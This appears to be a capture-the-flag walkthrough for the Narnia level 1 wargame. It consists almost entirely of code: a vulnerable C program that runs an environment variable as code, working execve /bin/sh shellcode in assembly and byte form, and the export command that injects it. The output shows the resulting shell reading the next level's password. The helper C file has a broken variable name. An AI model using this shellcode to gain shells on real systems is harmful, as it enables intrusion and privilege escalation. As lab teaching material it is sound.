```
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```

<img src="https://github.com/favicon.ico" width="48">

<!--- [Image of Yaktocat](https://octodex.github.com/images/yaktocat.png =250x) -->

```
narnia1@narnia:~$ cat shell.nasm
Xor     eax, eax    ;Clearing eax register
push    eax         ;Pushing NULL bytes
push    0x68732f2f  ;Pushing //sh
push    0x6e69622f  ;Pushing /bin
mov     ebx, esp    ;ebx now has address of /bin//sh
push    eax         ;Pushing NULL byte
mov     edx, esp    ;edx now has address of NULL byte
push    ebx         ;Pushing address of /bin//sh
mov     ecx, esp    ;ecx now has address of address
                    ;of /bin//sh byte
mov     al, 11      ;syscall number of execve is 11
int     0x80        ;Make the system call
```

```
nasm -f elf shell.nasm
```

```
narnia1@narnia:~$ objdump -d -M intel shell.o

shell.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	31 c0                	xor    eax,eax
   2:	50                   	push   eax
   3:	68 2f 2f 73 68       	push   0x68732f2f
   8:	68 2f 62 69 6e       	push   0x6e69622f
   d:	89 e3                	mov    ebx,esp
   f:	50                   	push   eax
  10:	89 e2                	mov    edx,esp
  12:	53                   	push   ebx
  13:	89 e1                	mov    ecx,esp
  15:	b0 0b                	mov    al,0xb
  17:	cd 80                	int    0x80
```

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

```
export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"') && /narnia/narnia1
```

```
narnia1@narnia:~$ ./shell
```

```
narnia1@narnia:~$ echo $EGG
�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S��
                             ̀
narnia1@narnia:~$ /narnia/narnia1
Trying to execute EGG!
$
```
```
cat /etc/narnia_pass/narnia2
nairiepecu
```

```
narnia1@narnia:~$ cat shell.c
char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
    setenv("EGG", shell, 1);
    putenv(shell);
    system("bash");
    return 0;
}
```

```
gcc -o shell shell.c -m32 -O0
```
